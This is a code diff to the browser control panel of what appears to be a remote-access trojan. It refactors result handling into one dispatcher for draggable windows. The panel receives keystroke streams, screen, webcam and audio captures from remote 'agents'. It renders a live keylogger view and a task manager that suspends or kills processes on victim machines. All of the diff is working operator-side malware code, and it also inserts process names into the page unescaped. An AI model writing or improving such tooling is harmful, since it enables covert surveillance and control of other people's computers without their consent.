@@ -1190,6 +1190,8 @@
                 logTerminal(`[${cid}] ${tag}: ${snippet}${fullData.length > 300 ? '...' : ''}`, 'succ');
                 islandNotify('check-circle', `RESULT: ${tag.toUpperCase()}`, 'success', 3000);
 
+                if(typeof window.handleResult === 'function' && window.handleResult(cid, tag, fullData)) return;
+
                 if(fullData.length > 20 && !['screen','webcam','audio','clickscreen','keylog_stream','keylog_dump','ps_list','processes'].includes(tag.toLowerCase())) {
                     showResult(tag.toUpperCase() + ' — Agent ' + cid, fullData);
                 }
@@ -1630,46 +1632,6 @@ function startKeylogger() {
 
     const win = createDragWindow('keylog-win', 'Live Keylogger Intercept', 'fa-solid fa-keyboard', kbHtml);
     win.style.width = '700px';
-
-    let lastKeylogLen = 0;
-
-    // Override handleResult to catch keylog_stream specifically for the keyboard
-    const prevHandler = window.handleResult || function(){};
-    window.handleResult = function(cid, tag, fullData) {
-        if(tag.toLowerCase().includes('keylog')) {
-            const buf = document.getElementById('keylog-buffer');
-            if(buf) {
-                // Determine if we're getting a chunk (base64) or a full dump (plain)
-                let chunk = fullData;
-                try {
-                    // keylog_stream data is base64 encoded
-                    if(tag.toLowerCase() === 'keylog_stream') chunk = atob(fullData);
-                } catch(e) {}
-                
-                buf.textContent += chunk;
-                // Animate keys that appear
-                const keys = chunk.match(/\[(.*?)\]/g) || [];
-                keys.forEach((k, i) => {
-                    setTimeout(() => {
-                        let kName = k.replace('[','').replace(']','');
-                        let btn = document.getElementById('vk-' + kName);
-                        if(!btn) {
-                            // Try mapping some generic ones
-                            if(kName.includes('Shift')) btn = document.getElementById('vk-LShiftKey');
-                            if(kName.includes('Control')) btn = document.getElementById('vk-LControlKey');
-                            if(kName.includes('Alt')) btn = document.getElementById('vk-LMenu');
-                        }
-                        if(btn) {
-                            btn.classList.add('active');
-                            setTimeout(() => btn.classList.remove('active'), 300);
-                        }
-                    }, i * 150); // cascading press effect
-                });
-            }
-            return; // consume
-        }
-        prevHandler(cid, tag, fullData);
-    };
 }
 
 function startProcessManager() {
@@ -1701,43 +1663,70 @@ function startProcessManager() {
     const win = createDragWindow('pm-win', 'Task Manager', 'fa-solid fa-list', html);
     win.style.width = '600px';
     win.style.height = '450px';
-    
-    // Setup specific handleResult hook for the process list
-    const prevHandler = window.handleResult || function(){};
-    window.handleResult = function(cid, tag, fullData) {
-        if(tag.toLowerCase() === 'ps_list' || tag.toLowerCase() === 'processes') {
-            const tbody = document.getElementById('pm-tbody');
-            if(tbody) {
-                try {
-                    const procs = JSON.parse(fullData);
-                    tbody.innerHTML = '';
-                    procs.forEach(p => {
-                        const tr = document.createElement('tr');
-                        tr.style.borderBottom = '1px solid rgba(255,255,255,0.05)';
-                        tr.innerHTML = `
-                            <td style="padding:8px 10px; color:var(--accent);">${p.pid}</td>
-                            <td style="padding:8px 10px;">${p.name}</td>
-                            <td style="padding:8px 10px; color:var(--text-muted);">${p.mem}</td>
-                            <td style="padding:8px 10px; text-align:right; white-space:nowrap;">
-                                <button onclick="execute('${cid}', 'ps_suspend ${p.pid}')" style="background:#555;color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;margin-right:4px;" title="Freeze"><i class="fa-solid fa-pause"></i></button>
-                                <button onclick="execute('${cid}', 'ps_resume ${p.pid}')" style="background:#555;color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;margin-right:4px;" title="Resume"><i class="fa-solid fa-play"></i></button>
-                                <button onclick="if(confirm('Kill PID ${p.pid}?')) execute('${cid}', 'ps_kill ${p.pid}')" style="background:var(--danger);color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;" title="Kill"><i class="fa-solid fa-skull"></i></button>
-                            </td>
-                        `;
-                        tbody.appendChild(tr);
-                    });
-                } catch(e) {
-                    tbody.innerHTML = `<tr><td colspan="4" style="padding:10px;color:var(--danger)">Failed to parse processes: ${e.message}</td></tr>`;
-                }
-            }
-            return;
-        }
-        prevHandler(cid, tag, fullData);
-    };
 }
 
-// Intercept specific Result updates to feed them to Drag Windows instead of universal modal
-const originalHandleResult = window.handleResult || function(){};
+// Central Result Dispatcher for Draggable Windows
+window.handleResult = function(cid, tag, fullData) {
+    const lTag = tag.toLowerCase();
+    
+    // 1. Keylogger Handling
+    if(lTag.includes('keylog')) {
+        const buf = document.getElementById('keylog-buffer');
+        if(buf) {
+            let chunk = fullData;
+            try { if(lTag === 'keylog_stream') chunk = atob(fullData); } catch(e) {}
+            buf.textContent += chunk;
+            const keys = chunk.match(/\[(.*?)\]/g) || [];
+            keys.forEach((k, i) => {
+                setTimeout(() => {
+                    let kName = k.replace('[','').replace(']','');
+                    let btn = document.getElementById('vk-' + kName);
+                    if(!btn) {
+                        if(kName.includes('Shift')) btn = document.getElementById('vk-LShiftKey');
+                        if(kName.includes('Control')) btn = document.getElementById('vk-LControlKey');
+                        if(kName.includes('Alt')) btn = document.getElementById('vk-LMenu');
+                    }
+                    if(btn) {
+                        btn.classList.add('active');
+                        setTimeout(() => btn.classList.remove('active'), 300);
+                    }
+                }, i * 150);
+            });
+        }
+        return true;
+    }
+
+    // 2. Process Manager Handling
+    if(lTag === 'ps_list' || lTag === 'processes') {
+        const tbody = document.getElementById('pm-tbody');
+        if(tbody) {
+            try {
+                const procs = JSON.parse(fullData);
+                tbody.innerHTML = '';
+                procs.forEach(p => {
+                    const tr = document.createElement('tr');
+                    tr.style.borderBottom = '1px solid rgba(255,255,255,0.05)';
+                    tr.innerHTML = `
+                        <td style="padding:8px 10px; color:var(--accent);">${p.pid}</td>
+                        <td style="padding:8px 10px;">${p.name}</td>
+                        <td style="padding:8px 10px; color:var(--text-muted);">${p.mem}</td>
+                        <td style="padding:8px 10px; text-align:right; white-space:nowrap;">
+                            <button onclick="execute('${cid}', 'ps_suspend ${p.pid}')" style="background:#555;color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;margin-right:4px;" title="Freeze"><i class="fa-solid fa-pause"></i></button>
+                            <button onclick="execute('${cid}', 'ps_resume ${p.pid}')" style="background:#555;color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;margin-right:4px;" title="Resume"><i class="fa-solid fa-play"></i></button>
+                            <button onclick="if(confirm('Kill PID ${p.pid}?')) execute('${cid}', 'ps_kill ${p.pid}')" style="background:var(--danger);color:#fff;border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.8rem;" title="Kill"><i class="fa-solid fa-skull"></i></button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            } catch(e) {
+                tbody.innerHTML = `<tr><td colspan="4" style="padding:10px;color:var(--danger)">Failed to parse processes: ${e.message}</td></tr>`;
+            }
+        }
+        return true;
+    }
+    
+    return false; // Not handled
+};
 
 </script>
 </body>
